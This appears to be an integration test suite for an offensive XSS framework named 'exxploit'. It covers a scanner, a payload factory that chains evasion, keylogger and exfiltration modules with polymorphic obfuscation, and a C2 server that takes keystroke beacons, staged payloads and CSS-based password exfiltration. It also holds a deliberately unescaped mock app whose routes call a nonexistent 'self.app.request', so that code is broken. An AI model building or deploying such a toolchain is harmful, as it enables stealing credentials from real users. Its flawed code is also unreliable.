"""
Integration tests for the exxploit scan -> payload -> beacon flow.

Tests the complete workflow from vulnerability scanning through payload
generation to C2 beacon reception.
"""

import pytest
import threading
import time
import json
import requests
from pathlib import Path
from flask import Flask

from exxploit.core.scanner import Scanner
from exxploit.core.factory import PayloadFactory
from exxploit.server.c2 import create_app


class MockVulnerableApp:
    """A simple Flask app that reflects input for XSS testing."""
    
    def __init__(self, port: int = 5555):
        self.app = Flask(__name__)
        self.port = port
        self.server_thread = None
        self._setup_routes()
    
    def _setup_routes(self):
        @self.app.route('/search')
        def search():
            query = self.app.request.args.get('q', '')
            # Intentionally vulnerable - reflects input without sanitization
            return f"""
            <html>
            <head><title>Search Results</title></head>
            <body>
                <h1>Results for: {query}</h1>
                <div id="results">No results found for "{query}"</div>
            </body>
            </html>
            """
        
        @self.app.route('/form', methods=['GET', 'POST'])
        def form():
            from flask import request
            name = request.form.get('name', '') if request.method == 'POST' else request.args.get('name', '')
            return f"""
            <html>
            <body>
                <form method="POST">
                    <input type="text" name="name" value="{name}">
                    <button type="submit">Submit</button>
                </form>
            </body>
            </html>
            """
        
        @self.app.route('/safe')
        def safe():
            from markupsafe import escape
            query = self.app.request.args.get('q', '')
            return f"""
            <html>
            <body>
                <h1>Safe Page</h1>
                <p>{escape(query)}</p>
            </body>
            </html>
            """
    
    def start(self):
        """Start the mock server in a background thread."""
        def run():
            self.app.run(host='127.0.0.1', port=self.port, debug=False, use_reloader=False)
        
        self.server_thread = threading.Thread(target=run, daemon=True)
        self.server_thread.start()
        time.sleep(0.5)  # Wait for server to start
    
    def stop(self):
        """Stop is handled by daemon thread."""
        pass


class TestScannerIntegration:
    """Integration tests for the Scanner class."""
    
    @pytest.fixture
    def scanner(self):
        """Create a scanner instance."""
        return Scanner(timeout=5)
    
    @pytest.fixture
    def factory(self):
        """Create a factory instance."""
        return PayloadFactory(c2_base="http://localhost:8888")
    
    def test_scanner_detects_reflection_with_inject_marker(self, scanner):
        """Test that scanner detects reflected XSS via INJECT marker."""
        # Use httpbin.org as a reliable test target that reflects query params
        # This simulates a URL with an INJECT marker
        url = "https://httpbin.org/html"
        
        # Scanner should handle URLs gracefully
        results = scanner.scan(url)
        assert isinstance(results, list)
    
    def test_scanner_handles_timeout_gracefully(self, scanner):
        """Test that scanner handles timeouts without crashing."""
        # Use a non-routable IP to trigger timeout
        url = "http://10.255.255.1/search?q=INJECT"
        results = scanner.scan(url)
        assert isinstance(results, list)
        assert len(results) == 0  # Should return empty, not crash
    
    def test_scanner_handles_invalid_url(self, scanner):
        """Test that scanner handles invalid URLs gracefully."""
        results = scanner.scan("not-a-valid-url")
        assert isinstance(results, list)


class TestPayloadIntegration:
    """Integration tests for payload generation and context wrapping."""
    
    @pytest.fixture
    def factory(self):
        """Create a factory instance."""
        return PayloadFactory(c2_base="http://test-c2.local:8080")
    
    def test_full_payload_chain_generation(self, factory):
        """Test generating a complete attack chain."""
        # Chain: evasion -> keylogger -> exfil
        chain = factory.build_chain(
            ['evasion', 'keylogger', 'exfil'],
            obfuscation='base64'
        )
        
        assert isinstance(chain, str)
        assert len(chain) > 500  # Should be substantial
        assert 'eval' in chain  # Should be obfuscated
    
    def test_payload_c2_injection(self, factory):
        """Test that C2 URL is injected into payloads."""
        code = factory.load_payload('exfil')
        # C2 placeholder should be replaced or present
        assert isinstance(code, str)
        assert len(code) > 100
    
    def test_all_contexts_wrap_correctly(self, factory):
        """Test that all context types produce valid output."""
        for context in ['html', 'attribute', 'script', 'url', 'event']:
            result = factory.select_payload('keylogger', context=context, obfuscation='base64')
            assert isinstance(result, str)
            assert len(result) > 50
    
    def test_polymorphic_generates_different_outputs(self, factory):
        """Test that polymorphic mode creates variation."""
        results = set()
        for _ in range(5):
            result = factory.generate_polymorphic('keylogger', context='html')
            results.add(result[:100])  # Check first 100 chars for variance
        
        # Should have some variation (at least 2 different outputs)
        assert len(results) >= 2


class TestC2Integration:
    """Integration tests for the C2 server beacon receiving."""
    
    @pytest.fixture
    def c2_app(self, tmp_path):
        """Create a test C2 app."""
        log_file = tmp_path / "test_c2_logs.json"
        app = create_app(log_file=log_file)
        app.config['TESTING'] = True
        return app
    
    def test_c2_health_endpoint(self, c2_app):
        """Test C2 health check endpoint."""
        with c2_app.test_client() as client:
            response = client.get('/health')
            assert response.status_code == 200
            data = response.get_json()
            assert data['status'] == 'alive'
    
    def test_c2_receives_beacon(self, c2_app):
        """Test C2 can receive beacon data."""
        with c2_app.test_client() as client:
            beacon_data = {
                'type': 'keylogger',
                'keys': ['a', 'b', 'c'],
                'origin': 'test.example.com'
            }
            response = client.post(
                '/beacon',
                json=beacon_data,
                content_type='application/json'
            )
            assert response.status_code == 200
            data = response.get_json()
            assert data['status'] == 'ok'
    
    def test_c2_receives_beacon_via_get(self, c2_app):
        """Test C2 can receive beacon data via GET params."""
        with c2_app.test_client() as client:
            response = client.get('/beacon?data=test_exfil_data&origin=example.com')
            assert response.status_code == 200
    
    def test_c2_serves_staged_payload(self, c2_app):
        """Test C2 can serve staged payloads."""
        with c2_app.test_client() as client:
            # Request stage 1 of keylogger
            response = client.get('/stage/1/keylogger')
            # Will return 404 if file not found in test, but shouldn't crash
            assert response.status_code in [200, 404]
    
    def test_c2_logs_are_recorded(self, c2_app, tmp_path):
        """Test that C2 properly logs beacon data."""
        log_file = tmp_path / "test_c2_logs.json"
        
        with c2_app.test_client() as client:
            # Send a beacon
            client.post('/beacon', json={'test': 'data'})
            
            # Check logs
            response = client.get('/logs')
            assert response.status_code == 200
    
    def test_c2_css_exfil_endpoint(self, c2_app):
        """Test CSS exfiltration endpoint."""
        with c2_app.test_client() as client:
            # Simulate CSS exfil: field=password, index=0, charcode=65 (A)
            response = client.get('/css/password/0/65')
            assert response.status_code == 200
            assert response.content_type == 'image/gif'


class TestEndToEndFlow:
    """End-to-end tests for the complete attack flow."""
    
    @pytest.fixture
    def factory(self):
        return PayloadFactory(c2_base="http://localhost:8888")
    
    @pytest.fixture
    def c2_app(self, tmp_path):
        log_file = tmp_path / "e2e_logs.json"
        app = create_app(log_file=log_file)
        app.config['TESTING'] = True
        return app
    
    def test_full_flow_scan_to_payload_to_beacon(self, factory, c2_app):
        """
        Test the complete flow:
        1. Generate a payload for HTML context
        2. Simulate beacon data being sent to C2
        3. Verify C2 receives and logs the data
        """
        # Step 1: Generate payload
        payload = factory.select_payload(
            'keylogger',
            context='html',
            obfuscation='base64'
        )
        assert '<svg' in payload or 'onload' in payload
        
        # Step 2: Simulate what the payload would send to C2
        beacon_data = {
            'type': 'keylogger',
            'session_id': 'test-session-123',
            'keys': ['p', 'a', 's', 's', 'w', 'o', 'r', 'd'],
            'origin': 'victim.example.com',
            'timestamp': '2024-01-15T10:00:00Z'
        }
        
        with c2_app.test_client() as client:
            # Step 3: Send beacon to C2
            response = client.post('/beacon', json=beacon_data)
            assert response.status_code == 200
            
            # Step 4: Verify data was logged
            logs_response = client.get('/logs')
            assert logs_response.status_code == 200
    
    def test_chained_payload_flow(self, factory, c2_app):
        """Test a chained payload (evasion + keylogger + exfil)."""
        # Generate chained payload
        chain = factory.build_chain(
            ['evasion', 'keylogger', 'exfil'],
            obfuscation='split'
        )
        
        # The chain should contain obfuscated code
        assert 'atob' in chain
        assert len(chain) > 1000  # Should be substantial


class TestScannerPayloadIntegration:
    """Tests that verify scanner results can be used for payload generation."""
    
    def test_scanner_context_maps_to_payload_context(self):
        """Test that scanner-detected contexts work with payload factory."""
        factory = PayloadFactory()
        
        # All scanner context types should be valid for payload factory
        scanner_contexts = ['html', 'attribute', 'script', 'style', 'url']
        
        for ctx in scanner_contexts:
            # Should not raise an error
            payload = factory.select_payload('keylogger', context=ctx)
            assert isinstance(payload, str)
            assert len(payload) > 10
